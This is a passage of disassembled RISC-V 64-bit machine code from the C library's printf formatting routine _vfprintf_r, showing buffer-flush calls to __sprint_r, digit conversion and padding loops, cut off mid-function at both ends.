   1158a:	f23e                	sd	a5,288(sp)
   1158c:	10e12c23          	sw	a4,280(sp)
   11590:	0341                	addi	t1,t1,16
   11592:	fee3d3e3          	bge	t2,a4,11578 <_vfprintf_r+0xcaa>
   11596:	0a10                	addi	a2,sp,272
   11598:	85d2                	mv	a1,s4
   1159a:	8556                	mv	a0,s5
   1159c:	e4c6                	sd	a7,72(sp)
   1159e:	e0f6                	sd	t4,64(sp)
   115a0:	fc7e                	sd	t6,56(sp)
   115a2:	f816                	sd	t0,48(sp)
   115a4:	e436                	sd	a3,8(sp)
   115a6:	0e7070ef          	jal	ra,18e8c <__sprint_r>
   115aa:	ec0512e3          	bnez	a0,1146e <_vfprintf_r+0xba0>
   115ae:	66a2                	ld	a3,8(sp)
   115b0:	7792                	ld	a5,288(sp)
   115b2:	11812703          	lw	a4,280(sp)
   115b6:	36c1                	addiw	a3,a3,-16
   115b8:	68a6                	ld	a7,72(sp)
   115ba:	6e86                	ld	t4,64(sp)
   115bc:	7fe2                	ld	t6,56(sp)
   115be:	72c2                	ld	t0,48(sp)
   115c0:	835e                	mv	t1,s7
   115c2:	439d                	li	t2,7
   115c4:	fadd4de3          	blt	s10,a3,1157e <_vfprintf_r+0xcb0>
   115c8:	2705                	addiw	a4,a4,1
   115ca:	97b6                	add	a5,a5,a3
   115cc:	00d33423          	sd	a3,8(t1)
   115d0:	01133023          	sd	a7,0(t1)
   115d4:	0007069b          	sext.w	a3,a4
   115d8:	10e12c23          	sw	a4,280(sp)
   115dc:	f23e                	sd	a5,288(sp)
   115de:	471d                	li	a4,7
   115e0:	0341                	addi	t1,t1,16
   115e2:	cad75d63          	bge	a4,a3,10a9c <_vfprintf_r+0x1ce>
   115e6:	0a10                	addi	a2,sp,272
   115e8:	85d2                	mv	a1,s4
   115ea:	8556                	mv	a0,s5
   115ec:	fc76                	sd	t4,56(sp)
   115ee:	f87e                	sd	t6,48(sp)
   115f0:	e416                	sd	t0,8(sp)
   115f2:	09b070ef          	jal	ra,18e8c <__sprint_r>
   115f6:	e6051ce3          	bnez	a0,1146e <_vfprintf_r+0xba0>
   115fa:	7792                	ld	a5,288(sp)
   115fc:	7ee2                	ld	t4,56(sp)
   115fe:	7fc2                	ld	t6,48(sp)
   11600:	62a2                	ld	t0,8(sp)
   11602:	835e                	mv	t1,s7
   11604:	c98ff06f          	j	10a9c <_vfprintf_r+0x1ce>
   11608:	0a10                	addi	a2,sp,272
   1160a:	85d2                	mv	a1,s4
   1160c:	8556                	mv	a0,s5
   1160e:	f876                	sd	t4,48(sp)
   11610:	e47e                	sd	t6,8(sp)
   11612:	07b070ef          	jal	ra,18e8c <__sprint_r>
   11616:	e4051ce3          	bnez	a0,1146e <_vfprintf_r+0xba0>
   1161a:	7792                	ld	a5,288(sp)
   1161c:	7ec2                	ld	t4,48(sp)
   1161e:	6fa2                	ld	t6,8(sp)
   11620:	835e                	mv	t1,s7
   11622:	cd2ff06f          	j	10af4 <_vfprintf_r+0x226>
   11626:	11812703          	lw	a4,280(sp)
   1162a:	0000b897          	auipc	a7,0xb
   1162e:	1e688893          	addi	a7,a7,486 # 1c810 <blanks.4520>
   11632:	4c1d                	li	s8,7
   11634:	009d4663          	blt	s10,s1,11640 <_vfprintf_r+0xd72>
   11638:	a081                	j	11678 <_vfprintf_r+0xdaa>
   1163a:	34c1                	addiw	s1,s1,-16
   1163c:	029d5e63          	bge	s10,s1,11678 <_vfprintf_r+0xdaa>
   11640:	2705                	addiw	a4,a4,1
   11642:	07c1                	addi	a5,a5,16
   11644:	01133023          	sd	a7,0(t1)
   11648:	01a33423          	sd	s10,8(t1)
   1164c:	f23e                	sd	a5,288(sp)
   1164e:	10e12c23          	sw	a4,280(sp)
   11652:	0341                	addi	t1,t1,16
   11654:	feec53e3          	bge	s8,a4,1163a <_vfprintf_r+0xd6c>
   11658:	0a10                	addi	a2,sp,272
   1165a:	85d2                	mv	a1,s4
   1165c:	8556                	mv	a0,s5
   1165e:	e446                	sd	a7,8(sp)
   11660:	02d070ef          	jal	ra,18e8c <__sprint_r>
   11664:	e00515e3          	bnez	a0,1146e <_vfprintf_r+0xba0>
   11668:	34c1                	addiw	s1,s1,-16
   1166a:	7792                	ld	a5,288(sp)
   1166c:	11812703          	lw	a4,280(sp)
   11670:	68a2                	ld	a7,8(sp)
   11672:	835e                	mv	t1,s7
   11674:	fc9d46e3          	blt	s10,s1,11640 <_vfprintf_r+0xd72>
   11678:	0017069b          	addiw	a3,a4,1
   1167c:	97a6                	add	a5,a5,s1
   1167e:	01133023          	sd	a7,0(t1)
   11682:	00933423          	sd	s1,8(t1)
   11686:	f23e                	sd	a5,288(sp)
   11688:	10d12c23          	sw	a3,280(sp)
   1168c:	471d                	li	a4,7
   1168e:	cad75663          	bge	a4,a3,10b3a <_vfprintf_r+0x26c>
   11692:	0a10                	addi	a2,sp,272
   11694:	85d2                	mv	a1,s4
   11696:	8556                	mv	a0,s5
   11698:	7f4070ef          	jal	ra,18e8c <__sprint_r>
   1169c:	dc0519e3          	bnez	a0,1146e <_vfprintf_r+0xba0>
   116a0:	7792                	ld	a5,288(sp)
   116a2:	c98ff06f          	j	10b3a <_vfprintf_r+0x26c>
   116a6:	562e                	lw	a2,232(sp)
   116a8:	3ec05e63          	blez	a2,11aa4 <_vfprintf_r+0x11d6>
   116ac:	6766                	ld	a4,88(sp)
   116ae:	7682                	ld	a3,32(sp)
   116b0:	00070c1b          	sext.w	s8,a4
   116b4:	28e6c263          	blt	a3,a4,11938 <_vfprintf_r+0x106a>
   116b8:	03805263          	blez	s8,116dc <_vfprintf_r+0xe0e>
   116bc:	11812703          	lw	a4,280(sp)
   116c0:	97e2                	add	a5,a5,s8
   116c2:	01933023          	sd	s9,0(t1)
   116c6:	0017069b          	addiw	a3,a4,1
   116ca:	01833423          	sd	s8,8(t1)
   116ce:	f23e                	sd	a5,288(sp)
   116d0:	10d12c23          	sw	a3,280(sp)
   116d4:	471d                	li	a4,7
   116d6:	0341                	addi	t1,t1,16
   116d8:	6ed74d63          	blt	a4,a3,11dd2 <_vfprintf_r+0x1504>
   116dc:	fffc4713          	not	a4,s8
   116e0:	977d                	srai	a4,a4,0x3f
   116e2:	00ec7c33          	and	s8,s8,a4
   116e6:	6766                	ld	a4,88(sp)
   116e8:	41870c3b          	subw	s8,a4,s8
   116ec:	33804c63          	bgtz	s8,11a24 <_vfprintf_r+0x1156>
   116f0:	66e6                	ld	a3,88(sp)
   116f2:	4004f713          	andi	a4,s1,1024
   116f6:	00dc8db3          	add	s11,s9,a3
   116fa:	54071f63          	bnez	a4,11c58 <_vfprintf_r+0x138a>
   116fe:	572e                	lw	a4,232(sp)
   11700:	7682                	ld	a3,32(sp)
   11702:	00d74663          	blt	a4,a3,1170e <_vfprintf_r+0xe40>
   11706:	0014f693          	andi	a3,s1,1
   1170a:	6e068063          	beqz	a3,11dea <_vfprintf_r+0x151c>
   1170e:	76e6                	ld	a3,120(sp)
   11710:	7646                	ld	a2,112(sp)
   11712:	0341                	addi	t1,t1,16
   11714:	fed33823          	sd	a3,-16(t1)
   11718:	11812683          	lw	a3,280(sp)
   1171c:	97b2                	add	a5,a5,a2
   1171e:	fec33c23          	sd	a2,-8(t1)
   11722:	2685                	addiw	a3,a3,1
   11724:	0006861b          	sext.w	a2,a3
   11728:	10d12c23          	sw	a3,280(sp)
   1172c:	f23e                	sd	a5,288(sp)
   1172e:	469d                	li	a3,7
   11730:	22c6c7e3          	blt	a3,a2,1215e <_vfprintf_r+0x1890>
   11734:	7682                	ld	a3,32(sp)
   11736:	00dc8633          	add	a2,s9,a3
   1173a:	40e6873b          	subw	a4,a3,a4
   1173e:	41b6063b          	subw	a2,a2,s11
   11742:	0007069b          	sext.w	a3,a4
   11746:	00d65363          	bge	a2,a3,1174c <_vfprintf_r+0xe7e>
   1174a:	8732                	mv	a4,a2
   1174c:	00070c9b          	sext.w	s9,a4
   11750:	03905263          	blez	s9,11774 <_vfprintf_r+0xea6>
   11754:	11812603          	lw	a2,280(sp)
   11758:	97e6                	add	a5,a5,s9
   1175a:	01b33023          	sd	s11,0(t1)
   1175e:	0016059b          	addiw	a1,a2,1
   11762:	01933423          	sd	s9,8(t1)
   11766:	f23e                	sd	a5,288(sp)
   11768:	10b12c23          	sw	a1,280(sp)
   1176c:	461d                	li	a2,7
   1176e:	0341                	addi	t1,t1,16
   11770:	26b644e3          	blt	a2,a1,121d8 <_vfprintf_r+0x190a>
   11774:	fffccc13          	not	s8,s9
   11778:	43fc5c13          	srai	s8,s8,0x3f
   1177c:	018cfc33          	and	s8,s9,s8
   11780:	41868c3b          	subw	s8,a3,s8
   11784:	bb805563          	blez	s8,10b2e <_vfprintf_r+0x260>
   11788:	11812703          	lw	a4,280(sp)
   1178c:	3b8d5563          	bge	s10,s8,11b36 <_vfprintf_r+0x1268>
   11790:	4c9d                	li	s9,7
   11792:	a021                	j	1179a <_vfprintf_r+0xecc>
   11794:	3c41                	addiw	s8,s8,-16
   11796:	3b8d5063          	bge	s10,s8,11b36 <_vfprintf_r+0x1268>
   1179a:	2705                	addiw	a4,a4,1
   1179c:	07c1                	addi	a5,a5,16
   1179e:	01233023          	sd	s2,0(t1)
   117a2:	01a33423          	sd	s10,8(t1)
   117a6:	f23e                	sd	a5,288(sp)
   117a8:	10e12c23          	sw	a4,280(sp)
   117ac:	0341                	addi	t1,t1,16
   117ae:	feecd3e3          	bge	s9,a4,11794 <_vfprintf_r+0xec6>
   117b2:	0a10                	addi	a2,sp,272
   117b4:	85d2                	mv	a1,s4
   117b6:	8556                	mv	a0,s5
   117b8:	6d4070ef          	jal	ra,18e8c <__sprint_r>
   117bc:	ca0519e3          	bnez	a0,1146e <_vfprintf_r+0xba0>
   117c0:	7792                	ld	a5,288(sp)
   117c2:	11812703          	lw	a4,280(sp)
   117c6:	835e                	mv	t1,s7
   117c8:	b7f1                	j	11794 <_vfprintf_r+0xec6>
   117ca:	0014f513          	andi	a0,s1,1
   117ce:	cc0518e3          	bnez	a0,1149e <_vfprintf_r+0xbd0>
   117d2:	00b33423          	sd	a1,8(t1)
   117d6:	f26e                	sd	s11,288(sp)
   117d8:	10e12c23          	sw	a4,280(sp)
   117dc:	469d                	li	a3,7
   117de:	18e6c163          	blt	a3,a4,11960 <_vfprintf_r+0x1092>
   117e2:	2609                	addiw	a2,a2,2
   117e4:	02030313          	addi	t1,t1,32
   117e8:	bb35                	j	11524 <_vfprintf_r+0xc56>
   117ea:	d2d05de3          	blez	a3,11524 <_vfprintf_r+0xc56>
   117ee:	4cdd50e3          	bge	s10,a3,124ae <_vfprintf_r+0x1be0>
   117f2:	4c9d                	li	s9,7
   117f4:	a031                	j	11800 <_vfprintf_r+0xf32>
   117f6:	36c1                	addiw	a3,a3,-16
   117f8:	14dd5563          	bge	s10,a3,11942 <_vfprintf_r+0x1074>
   117fc:	0017089b          	addiw	a7,a4,1
   11800:	0dc1                	addi	s11,s11,16
   11802:	012c3023          	sd	s2,0(s8)
   11806:	01ac3423          	sd	s10,8(s8)
   1180a:	f26e                	sd	s11,288(sp)
   1180c:	0008871b          	sext.w	a4,a7
   11810:	11112c23          	sw	a7,280(sp)
   11814:	0c41                	addi	s8,s8,16
   11816:	feecd0e3          	bge	s9,a4,117f6 <_vfprintf_r+0xf28>
   1181a:	0a10                	addi	a2,sp,272
   1181c:	85d2                	mv	a1,s4
   1181e:	8556                	mv	a0,s5
   11820:	e436                	sd	a3,8(sp)
   11822:	66a070ef          	jal	ra,18e8c <__sprint_r>
   11826:	c40514e3          	bnez	a0,1146e <_vfprintf_r+0xba0>
   1182a:	7d92                	ld	s11,288(sp)
   1182c:	11812703          	lw	a4,280(sp)
   11830:	66a2                	ld	a3,8(sp)
   11832:	8c5e                	mv	s8,s7
   11834:	b7c9                	j	117f6 <_vfprintf_r+0xf28>
   11836:	01087793          	andi	a5,a6,16
   1183a:	eb8d                	bnez	a5,1186c <_vfprintf_r+0xf9e>
   1183c:	66c2                	ld	a3,16(sp)
   1183e:	04087793          	andi	a5,a6,64
   11842:	0006a983          	lw	s3,0(a3)
   11846:	36078c63          	beqz	a5,11bbe <_vfprintf_r+0x12f0>
   1184a:	19c2                	slli	s3,s3,0x30
   1184c:	0309d993          	srli	s3,s3,0x30
   11850:	e83a                	sd	a4,16(sp)
   11852:	4785                	li	a5,1
   11854:	c26ff06f          	j	10c7a <_vfprintf_r+0x3ac>
   11858:	0014f713          	andi	a4,s1,1
   1185c:	ac070963          	beqz	a4,10b2e <_vfprintf_r+0x260>
   11860:	b461                	j	112e8 <_vfprintf_r+0xa1a>
   11862:	6782                	ld	a5,0(sp)
   11864:	8ca2                	mv	s9,s0
   11866:	e31c                	sd	a5,0(a4)
   11868:	af8ff06f          	j	10b60 <_vfprintf_r+0x292>
   1186c:	67c2                	ld	a5,16(sp)
   1186e:	e83a                	sd	a4,16(sp)
   11870:	0007b983          	ld	s3,0(a5)
   11874:	4785                	li	a5,1
   11876:	c04ff06f          	j	10c7a <_vfprintf_r+0x3ac>
   1187a:	67c2                	ld	a5,16(sp)
   1187c:	639c                	ld	a5,0(a5)
   1187e:	89be                	mv	s3,a5
   11880:	b90ff06f          	j	10c10 <_vfprintf_r+0x342>
   11884:	67c2                	ld	a5,16(sp)
   11886:	0007b983          	ld	s3,0(a5)
   1188a:	be4ff06f          	j	10c6e <_vfprintf_r+0x3a0>
   1188e:	67c2                	ld	a5,16(sp)
   11890:	07bd                	addi	a5,a5,15
   11892:	9bc1                	andi	a5,a5,-16
   11894:	6394                	ld	a3,0(a5)
   11896:	6798                	ld	a4,8(a5)
   11898:	07c1                	addi	a5,a5,16
   1189a:	e83e                	sd	a5,16(sp)
   1189c:	e236                	sd	a3,256(sp)
   1189e:	e63a                	sd	a4,264(sp)
   118a0:	c50ff06f          	j	10cf0 <_vfprintf_r+0x422>
   118a4:	e83a                	sd	a4,16(sp)
   118a6:	47a5                	li	a5,9
   118a8:	8826                	mv	a6,s1
   118aa:	cb37f3e3          	bgeu	a5,s3,11550 <_vfprintf_r+0xc82>
   118ae:	40087793          	andi	a5,a6,1024
   118b2:	18c10c13          	addi	s8,sp,396
   118b6:	2781                	sext.w	a5,a5
   118b8:	f002                	sd	zero,32(sp)
   118ba:	85e2                	mv	a1,s8
   118bc:	44a9                	li	s1,10
   118be:	4725                	li	a4,9
   118c0:	0ff00693          	li	a3,255
   118c4:	a039                	j	118d2 <_vfprintf_r+0x1004>
   118c6:	0299d633          	divu	a2,s3,s1
   118ca:	9d3771e3          	bgeu	a4,s3,1128c <_vfprintf_r+0x9be>
   118ce:	89b2                	mv	s3,a2
   118d0:	85e6                	mv	a1,s9
   118d2:	7502                	ld	a0,32(sp)
   118d4:	fff58c93          	addi	s9,a1,-1
   118d8:	2505                	addiw	a0,a0,1
   118da:	f02a                	sd	a0,32(sp)
   118dc:	0299f633          	remu	a2,s3,s1
   118e0:	0306061b          	addiw	a2,a2,48
   118e4:	fec58fa3          	sb	a2,-1(a1)
   118e8:	dff9                	beqz	a5,118c6 <_vfprintf_r+0xff8>
   118ea:	7626                	ld	a2,104(sp)
   118ec:	00064603          	lbu	a2,0(a2)
   118f0:	fcc51be3          	bne	a0,a2,118c6 <_vfprintf_r+0xff8>
   118f4:	fcd609e3          	beq	a2,a3,118c6 <_vfprintf_r+0xff8>
   118f8:	99377ae3          	bgeu	a4,s3,1128c <_vfprintf_r+0x9be>
   118fc:	fc3e                	sd	a5,56(sp)
   118fe:	67aa                	ld	a5,136(sp)
   11900:	65ca                	ld	a1,144(sp)
   11902:	f81a                	sd	t1,48(sp)
   11904:	40fc8cb3          	sub	s9,s9,a5
   11908:	863e                	mv	a2,a5
   1190a:	8566                	mv	a0,s9
   1190c:	ec76                	sd	t4,24(sp)
   1190e:	e442                	sd	a6,8(sp)
   11910:	07b050ef          	jal	ra,1718a <strncpy>
   11914:	77a6                	ld	a5,104(sp)
   11916:	0299d633          	divu	a2,s3,s1
   1191a:	6822                	ld	a6,8(sp)
   1191c:	0017c583          	lbu	a1,1(a5)
   11920:	6ee2                	ld	t4,24(sp)
   11922:	7342                	ld	t1,48(sp)
   11924:	00b035b3          	snez	a1,a1
   11928:	97ae                	add	a5,a5,a1
   1192a:	f4be                	sd	a5,104(sp)
   1192c:	f002                	sd	zero,32(sp)
   1192e:	77e2                	ld	a5,56(sp)
   11930:	4725                	li	a4,9
   11932:	0ff00693          	li	a3,255
   11936:	bf61                	j	118ce <_vfprintf_r+0x1000>
   11938:	00068c1b          	sext.w	s8,a3
   1193c:	d98040e3          	bgtz	s8,116bc <_vfprintf_r+0xdee>
   11940:	bb71                	j	116dc <_vfprintf_r+0xe0e>
   11942:	0017061b          	addiw	a2,a4,1
   11946:	010c0713          	addi	a4,s8,16
   1194a:	9db6                	add	s11,s11,a3
   1194c:	00dc3423          	sd	a3,8(s8)
   11950:	012c3023          	sd	s2,0(s8)
   11954:	f26e                	sd	s11,288(sp)
   11956:	10c12c23          	sw	a2,280(sp)
   1195a:	469d                	li	a3,7
   1195c:	44c6d563          	bge	a3,a2,11da6 <_vfprintf_r+0x14d8>
   11960:	0a10                	addi	a2,sp,272
   11962:	85d2                	mv	a1,s4
   11964:	8556                	mv	a0,s5
   11966:	526070ef          	jal	ra,18e8c <__sprint_r>
   1196a:	b00512e3          	bnez	a0,1146e <_vfprintf_r+0xba0>
   1196e:	11812603          	lw	a2,280(sp)
   11972:	7d92                	ld	s11,288(sp)
   11974:	1a010313          	addi	t1,sp,416
   11978:	2605                	addiw	a2,a2,1
   1197a:	8c5e                	mv	s8,s7
   1197c:	b665                	j	11524 <_vfprintf_r+0xc56>
   1197e:	8826                	mv	a6,s1
   11980:	825ff06f          	j	111a4 <_vfprintf_r+0x8d6>
   11984:	0000b797          	auipc	a5,0xb
   11988:	cf478793          	addi	a5,a5,-780 # 1c678 <__clzdi2+0x19e>
   1198c:	f43e                	sd	a5,40(sp)
   1198e:	66c2                	ld	a3,16(sp)
   11990:	0204f793          	andi	a5,s1,32
   11994:	00868713          	addi	a4,a3,8
   11998:	c7f9                	beqz	a5,11a66 <_vfprintf_r+0x1198>
   1199a:	0006b983          	ld	s3,0(a3)
   1199e:	0014f793          	andi	a5,s1,1
   119a2:	cf81                	beqz	a5,119ba <_vfprintf_r+0x10ec>
   119a4:	00098b63          	beqz	s3,119ba <_vfprintf_r+0x10ec>
   119a8:	0024e493          	ori	s1,s1,2
   119ac:	03000793          	li	a5,48
   119b0:	0ef10023          	sb	a5,224(sp)
   119b4:	0fb100a3          	sb	s11,225(sp)
   119b8:	2481                	sext.w	s1,s1
   119ba:	bff4f493          	andi	s1,s1,-1025
   119be:	0004881b          	sext.w	a6,s1
   119c2:	e83a                	sd	a4,16(sp)
   119c4:	4789                	li	a5,2
   119c6:	ab4ff06f          	j	10c7a <_vfprintf_r+0x3ac>
   119ca:	2004e493          	ori	s1,s1,512
   119ce:	00144f03          	lbu	t5,1(s0)
   119d2:	2481                	sext.w	s1,s1
   119d4:	0405                	addi	s0,s0,1
   119d6:	82cff06f          	j	10a02 <_vfprintf_r+0x134>
   119da:	0204e493          	ori	s1,s1,32
   119de:	00144f03          	lbu	t5,1(s0)
   119e2:	2481                	sext.w	s1,s1
   119e4:	0405                	addi	s0,s0,1
   119e6:	81cff06f          	j	10a02 <_vfprintf_r+0x134>
   119ea:	0a10                	addi	a2,sp,272
   119ec:	85d2                	mv	a1,s4
   119ee:	8556                	mv	a0,s5
   119f0:	49c070ef          	jal	ra,18e8c <__sprint_r>
   119f4:	a6051de3          	bnez	a0,1146e <_vfprintf_r+0xba0>
   119f8:	7792                	ld	a5,288(sp)
   119fa:	835e                	mv	t1,s7
   119fc:	ba09                	j	1130e <_vfprintf_r+0xa40>
   119fe:	0000b797          	auipc	a5,0xb
   11a02:	c6278793          	addi	a5,a5,-926 # 1c660 <__clzdi2+0x186>
   11a06:	f43e                	sd	a5,40(sp)
   11a08:	b759                	j	1198e <_vfprintf_r+0x10c0>
   11a0a:	4799                	li	a5,6
   11a0c:	000e8c1b          	sext.w	s8,t4
   11a10:	3dd7eb63          	bltu	a5,t4,11de6 <_vfprintf_r+0x1518>
   11a14:	89e2                	mv	s3,s8
   11a16:	e836                	sd	a3,16(sp)
   11a18:	0000bc97          	auipc	s9,0xb
   11a1c:	c78c8c93          	addi	s9,s9,-904 # 1c690 <__clzdi2+0x1b6>
   11a20:	854ff06f          	j	10a74 <_vfprintf_r+0x1a6>
   11a24:	11812703          	lw	a4,280(sp)
   11a28:	218d5063          	bge	s10,s8,11c28 <_vfprintf_r+0x135a>
   11a2c:	4d9d                	li	s11,7
   11a2e:	a021                	j	11a36 <_vfprintf_r+0x1168>
   11a30:	3c41                	addiw	s8,s8,-16
   11a32:	1f8d5b63          	bge	s10,s8,11c28 <_vfprintf_r+0x135a>
   11a36:	2705                	addiw	a4,a4,1
   11a38:	07c1                	addi	a5,a5,16
   11a3a:	01233023          	sd	s2,0(t1)
   11a3e:	01a33423          	sd	s10,8(t1)
   11a42:	f23e                	sd	a5,288(sp)
   11a44:	10e12c23          	sw	a4,280(sp)
   11a48:	0341                	addi	t1,t1,16
   11a4a:	feedd3e3          	bge	s11,a4,11a30 <_vfprintf_r+0x1162>
   11a4e:	0a10                	addi	a2,sp,272
   11a50:	85d2                	mv	a1,s4
   11a52:	8556                	mv	a0,s5
   11a54:	438070ef          	jal	ra,18e8c <__sprint_r>
   11a58:	a0051be3          	bnez	a0,1146e <_vfprintf_r+0xba0>
   11a5c:	7792                	ld	a5,288(sp)
   11a5e:	11812703          	lw	a4,280(sp)
   11a62:	835e                	mv	t1,s7
   11a64:	b7f1                	j	11a30 <_vfprintf_r+0x1162>
   11a66:	0104f793          	andi	a5,s1,16
   11a6a:	c3cd                	beqz	a5,11b0c <_vfprintf_r+0x123e>
   11a6c:	67c2                	ld	a5,16(sp)
   11a6e:	0007b983          	ld	s3,0(a5)
   11a72:	b735                	j	1199e <_vfprintf_r+0x10d0>
   11a74:	0a10                	addi	a2,sp,272
   11a76:	85d2                	mv	a1,s4
   11a78:	8556                	mv	a0,s5
   11a7a:	412070ef          	jal	ra,18e8c <__sprint_r>
   11a7e:	9e0518e3          	bnez	a0,1146e <_vfprintf_r+0xba0>
   11a82:	7d92                	ld	s11,288(sp)
   11a84:	11812703          	lw	a4,280(sp)
   11a88:	8c5e                	mv	s8,s7
   11a8a:	b41d                	j	114b0 <_vfprintf_r+0xbe2>
   11a8c:	0a10                	addi	a2,sp,272
   11a8e:	85d2                	mv	a1,s4
   11a90:	8556                	mv	a0,s5
   11a92:	3fa070ef          	jal	ra,18e8c <__sprint_r>
   11a96:	9c051ce3          	bnez	a0,1146e <_vfprintf_r+0xba0>
   11a9a:	7d92                	ld	s11,288(sp)
   11a9c:	11812703          	lw	a4,280(sp)
   11aa0:	8c5e                	mv	s8,s7
   11aa2:	bc0d                	j	114d4 <_vfprintf_r+0xc06>
   11aa4:	11812703          	lw	a4,280(sp)
   11aa8:	0000b697          	auipc	a3,0xb
   11aac:	bf068693          	addi	a3,a3,-1040 # 1c698 <__clzdi2+0x1be>
   11ab0:	00d33023          	sd	a3,0(t1)
   11ab4:	2705                	addiw	a4,a4,1
   11ab6:	4685                	li	a3,1
   11ab8:	0785                	addi	a5,a5,1
   11aba:	00d33423          	sd	a3,8(t1)
   11abe:	10e12c23          	sw	a4,280(sp)
   11ac2:	0007069b          	sext.w	a3,a4
   11ac6:	f23e                	sd	a5,288(sp)
   11ac8:	471d                	li	a4,7
   11aca:	0341                	addi	t1,t1,16
   11acc:	2ed74363          	blt	a4,a3,11db2 <_vfprintf_r+0x14e4>
   11ad0:	c4061363          	bnez	a2,10f16 <_vfprintf_r+0x648>
   11ad4:	7682                	ld	a3,32(sp)
   11ad6:	0014f713          	andi	a4,s1,1
   11ada:	8f55                	or	a4,a4,a3
   11adc:	e319                	bnez	a4,11ae2 <_vfprintf_r+0x1214>
   11ade:	850ff06f          	j	10b2e <_vfprintf_r+0x260>
   11ae2:	76e6                	ld	a3,120(sp)
   11ae4:	7746                	ld	a4,112(sp)
   11ae6:	00d33023          	sd	a3,0(t1)
   11aea:	11812683          	lw	a3,280(sp)
   11aee:	97ba                	add	a5,a5,a4
   11af0:	00e33423          	sd	a4,8(t1)
   11af4:	2685                	addiw	a3,a3,1
   11af6:	0006871b          	sext.w	a4,a3
   11afa:	10d12c23          	sw	a3,280(sp)
   11afe:	f23e                	sd	a5,288(sp)
   11b00:	469d                	li	a3,7
   11b02:	c2e6cd63          	blt	a3,a4,10f3c <_vfprintf_r+0x66e>
   11b06:	0341                	addi	t1,t1,16
   11b08:	c54ff06f          	j	10f5c <_vfprintf_r+0x68e>
   11b0c:	66c2                	ld	a3,16(sp)
   11b0e:	0404f793          	andi	a5,s1,64
   11b12:	0006a983          	lw	s3,0(a3)
   11b16:	cbe1                	beqz	a5,11be6 <_vfprintf_r+0x1318>
   11b18:	19c2                	slli	s3,s3,0x30
   11b1a:	0309d993          	srli	s3,s3,0x30
   11b1e:	b541                	j	1199e <_vfprintf_r+0x10d0>
   11b20:	0a10                	addi	a2,sp,272
   11b22:	85d2                	mv	a1,s4
   11b24:	8556                	mv	a0,s5
   11b26:	366070ef          	jal	ra,18e8c <__sprint_r>
   11b2a:	940512e3          	bnez	a0,1146e <_vfprintf_r+0xba0>
   11b2e:	7792                	ld	a5,288(sp)
   11b30:	835e                	mv	t1,s7
   11b32:	faeff06f          	j	112e0 <_vfprintf_r+0xa12>
   11b36:	0017069b          	addiw	a3,a4,1
   11b3a:	8736                	mv	a4,a3
   11b3c:	97e2                	add	a5,a5,s8
   11b3e:	01233023          	sd	s2,0(t1)
   11b42:	fdbfe06f          	j	10b1c <_vfprintf_r+0x24e>
   11b46:	6512                	ld	a0,256(sp)
   11b48:	65b2                	ld	a1,264(sp)
   11b4a:	4601                	li	a2,0
   11b4c:	4681                	li	a3,0
   11b4e:	e41a                	sd	t1,8(sp)
   11b50:	6f0090ef          	jal	ra,1b240 <__letf2>
   11b54:	6322                	ld	t1,8(sp)
   11b56:	54054763          	bltz	a0,120a4 <_vfprintf_r+0x17d6>
   11b5a:	0df14783          	lbu	a5,223(sp)
   11b5e:	04700713          	li	a4,71
   11b62:	0000bc97          	auipc	s9,0xb
   11b66:	adec8c93          	addi	s9,s9,-1314 # 1c640 <__clzdi2+0x166>
   11b6a:	25b74f63          	blt	a4,s11,11dc8 <_vfprintf_r+0x14fa>
   11b6e:	f7f4f493          	andi	s1,s1,-129
   11b72:	ec02                	sd	zero,24(sp)
   11b74:	e882                	sd	zero,80(sp)
   11b76:	f082                	sd	zero,96(sp)
   11b78:	ec82                	sd	zero,88(sp)
   11b7a:	2481                	sext.w	s1,s1
   11b7c:	498d                	li	s3,3
   11b7e:	4c0d                	li	s8,3
   11b80:	4e81                	li	t4,0
   11b82:	8c079863          	bnez	a5,10c52 <_vfprintf_r+0x384>
   11b86:	ef9fe06f          	j	10a7e <_vfprintf_r+0x1b0>
   11b8a:	8566                	mv	a0,s9
   11b8c:	e41a                	sd	t1,8(sp)
   11b8e:	e836                	sd	a3,16(sp)
   11b90:	cabfe0ef          	jal	ra,1083a <strlen>
   11b94:	00050c1b          	sext.w	s8,a0
   11b98:	fffc4993          	not	s3,s8
   11b9c:	0df14783          	lbu	a5,223(sp)
   11ba0:	43f9d993          	srai	s3,s3,0x3f
   11ba4:	013c79b3          	and	s3,s8,s3
   11ba8:	ec02                	sd	zero,24(sp)
   11baa:	e882                	sd	zero,80(sp)
   11bac:	f082                	sd	zero,96(sp)
   11bae:	ec82                	sd	zero,88(sp)
   11bb0:	6322                	ld	t1,8(sp)
   11bb2:	2981                	sext.w	s3,s3
   11bb4:	4e81                	li	t4,0
   11bb6:	88079e63          	bnez	a5,10c52 <_vfprintf_r+0x384>
   11bba:	ec5fe06f          	j	10a7e <_vfprintf_r+0x1b0>
   11bbe:	20087793          	andi	a5,a6,512
   11bc2:	26078463          	beqz	a5,11e2a <_vfprintf_r+0x155c>
   11bc6:	0ff9f993          	andi	s3,s3,255
   11bca:	e83a                	sd	a4,16(sp)
   11bcc:	4785                	li	a5,1
   11bce:	8acff06f          	j	10c7a <_vfprintf_r+0x3ac>
   11bd2:	2004f793          	andi	a5,s1,512
   11bd6:	24078463          	beqz	a5,11e1e <_vfprintf_r+0x1550>
   11bda:	67c2                	ld	a5,16(sp)
   11bdc:	00078983          	lb	s3,0(a5)
   11be0:	87ce                	mv	a5,s3
   11be2:	82eff06f          	j	10c10 <_vfprintf_r+0x342>
   11be6:	2004f793          	andi	a5,s1,512
   11bea:	24078763          	beqz	a5,11e38 <_vfprintf_r+0x156a>
   11bee:	0ff9f993          	andi	s3,s3,255
   11bf2:	b375                	j	1199e <_vfprintf_r+0x10d0>
   11bf4:	2004f793          	andi	a5,s1,512
   11bf8:	20078e63          	beqz	a5,11e14 <_vfprintf_r+0x1546>
   11bfc:	0ff9f993          	andi	s3,s3,255
   11c00:	86eff06f          	j	10c6e <_vfprintf_r+0x3a0>
   11c04:	67b2                	ld	a5,264(sp)
   11c06:	2207cd63          	bltz	a5,11e40 <_vfprintf_r+0x1572>
   11c0a:	0df14783          	lbu	a5,223(sp)
   11c0e:	04700713          	li	a4,71
   11c12:	0000bc97          	auipc	s9,0xb
   11c16:	a3ec8c93          	addi	s9,s9,-1474 # 1c650 <__clzdi2+0x176>
   11c1a:	f5b75ae3          	bge	a4,s11,11b6e <_vfprintf_r+0x12a0>
   11c1e:	0000bc97          	auipc	s9,0xb
   11c22:	a3ac8c93          	addi	s9,s9,-1478 # 1c658 <__clzdi2+0x17e>
   11c26:	b7a1                	j	11b6e <_vfprintf_r+0x12a0>
   11c28:	0017069b          	addiw	a3,a4,1
